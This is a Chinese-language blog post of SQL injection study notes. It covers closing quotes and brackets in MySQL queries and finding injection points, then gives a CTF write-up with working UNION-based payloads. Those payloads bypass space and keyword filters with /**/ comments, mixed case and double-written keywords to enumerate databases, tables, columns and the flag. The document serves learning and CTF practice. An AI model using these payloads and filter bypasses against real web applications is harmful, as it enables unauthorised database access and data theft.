---
layout: post
title: "sqli-studying2"
date: 2019-05-16
author: jjnoob
categories:
- 2019-05
tags:
- sqli
---

* content
{:toc}

> 积累..


# 一. 引号闭合
> 引号闭合.


[参考Yi0nurs](https://blog.csdn.net/qiutyu/article/details/80314929)
```sql
$id=$_GET['id']; 
```
```sql
$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1"; 
```
下面的语句对id进行了修饰, 用`'`(单引号)把id括了起来. 所以我们构造语句的时候
1. 要把我们构造的语句 '逃逸' 出来.
2. 要把结构进行补全或者适当的注释。

<br />

# 二. mysql手工注入
[参考 隐念笎](https://www.cnblogs.com/zlgxzswjy/p/6707433.html)
## (1) 几种闭合方法:
```sql
select * from tables where id=$id;          /*这种情况下，$id变量多为数字型    不需要闭合符号，可以直接注入，但如果系统做了只能传入数字型的判断，就无法注入*/
select * from tables where id='$id';        /*这种情况下，$id变量多为字符型    需要闭合单引号，可以用?id=1'这种形式闭合*/
select * from tables where id="$id";        /*这种情况下，$id变量多为字符型    需要闭合双引号，可以用?id=1"这种形式闭合*/
select * from tables where id=($id);        /*这种情况下，$id变量多为数字型    需要闭合括号，可以用?id=1)这种形式闭合*/
select * from tables where id=('$id');      /*这种情况下，$id变量多为字符型    需要同时闭合单引号和括号，可以用?id=1')这种形式闭合*/
select * from tables where id=("$id");      /*这种情况下，$id变量多为字符型    需要同时闭合双引号和括号，可以用?id=1")这种形式闭合*/
select * from tables where id=(('$id'));    /*这种情况下，$id变量多为字符型    需要同时闭合单引号和两层括号，可以用?id=1'))这种形式闭合*/

select * from tables where id='$id' limit 0,1;    /*有些语句还有limit子句，我们可以通过上面提到的方法先闭合单引号，然后用%23，即注释符注释掉后面的语句，具体写法如下：?id=1'%23；即可闭合输出正确的语句*/
```
> `%23=#` 
> http中传输特殊的字符, 有些符号在URL中是不能直接传递的, 如果要在URL中传递这些特殊符号, 那么就要使用他们的编码了. 编码的格式为：%加字符的ASCII码


## (2) 手工注入
### 1. 找到注入点

在变量可控的部分加入一些符号，查看页面是否正常

网站www.example.com/index.php?id=1

这里的id变量是用户可控的，可以在id=1后加一个单引号，变成`id=1'` . 页面如果报错多了一个单引号，那么说明可能存在注入点。

也可以在id=1后通过and符号多增加多个判断，如果`'id=1 and 1=1'`页面正常，`'id=1 and 1=2'`时页面不正常，则这个页面边可能存在注入。

### 2. 闭合语句
一般来说，原有语句中的这个limit我们是无法利用的，多半可能会导致我们的闭合无法完成，而且为了后续便于我们遍历数据库，我们需要注入一个我们可控的limit子句，所以需要注释掉原有语句的limit子句，防止冲突。可以使用`%23`(#)等数据库注释符号，进行注释。


网站：`www.example.com/index.php?id=1`

他在数据中的查询语句是
```sql
select * from table where id='$id' limit 0,1;
```
那么我们注入的语句就可以是`?id=1' %23`

这个时候，带入到数据库查询的语句就变成了
```sql
select * from table where id='$id' #' limit 0,1;
```
`#`会把后面的语句注释掉，然后我们得到实际执行的语句就成了:
```sql
select * from table where id='$id';
```
> 因为由于编码的问题，在浏览器中直接提交#会变成空，所以我们使用url编码后的#，即`%23`，当传输到后端时，后端语言会对它自动解码成#，才能够成功带入数据库查询。


<br />

# 三. 实验吧-简单的sql注入

[题目链接](http://www.shiyanbar.com/ctf/1875)


## (1) 方法一
[参考 ShellMeShell丶](https://blog.csdn.net/Everywhere_wwx/article/details/71289107)

1. 输入`1 '`时发现MySQL报错, 可能存在注入`php?id`
2. 输入的语句中包含空格时会提示`SQLi detected!`(一开始碰到了, 后来就没碰到), 而不包含空格时, 则不会报错此类信息
3. 过滤了空格.
3. **知识点：当过滤空格时，通常用`()`或`/**/`代替空格**
4. 输入:`1/**/union/**/select/**/flag/**/from/**/flag/**/where/**/1=1`, 得到预期结果.
5. 加单引号闭合, `1'/**/union/**/select/**/flag/**/from/**/flag/**/where/**/'1'='1` 得到flag.

> 这里的字段flag和表flag是猜测的. 如果想得到表名和字段名就需要用其他办法.


## (2) 方法二
[参考wewww111](https://blog.csdn.net/wewww111/article/details/81589444)

[参考波哥在努力](https://www.cnblogs.com/tlbjiayou/p/10828601.html)


### 判断注入类型
输入`1' order by 1 #`, 报错的一部份为:`to use near '1 '' at line 1`
输入`1' orderrr by 1 #`, 报错的一部份为:`to use near 'orderrr 1'' at line 1`

可见`order`关键字被过滤, 同法也可知`select`等关键字也被过滤.
> 他这个过滤, 貌似不是一直总是过滤特定的关键字, 过滤的关键字貌似过一段时间就会变化. 有些writeup上面写`and`和空格也会过滤, 但是我没有试出来.


### 关键词被过滤的解决方法:
* 大小写交替: `Order SeLect` 
* 双写: `OderOrder SelectSelect` (双写后可能后面要加两个空格)
* 交叉： `selecselectt`  

### 主要步骤

用`/**/`绕过过滤，用`union`
暴库:
```sql
1'/**/union/**/select/**/schema_name/**/from/**/information_schema.schemata/**/where/**/'1'='1
```
> 参考的writeup作者说这里的database()貌似没用


爆表:
```sql
1'/**/union/**/select/**/table_name/**/from/**/information_schema.tables/**/where/**/'1'='1
```

爆字段:
```sql
1'/**/union/**/select/**/column_name/**/from/**/information_schema.coluinformation_schema.columnsmns/**/where/**/table_name='flag
```
报错
`infromation_schema.columns` 被过滤了,用交叉写法可以绕过
`column_name`也被过滤了

爆字段2:
```sql
1'/**/union/**/select/**/column_nacolumn_nameme/**/from/**/information_schema.coluinformation_schema.columnsmns/**/where/**/table_name='flag
```
最后一步:
```sql
1'/**/union/**/select/**/flag/**/from/**/flag/**/where/**/'1'='1
```

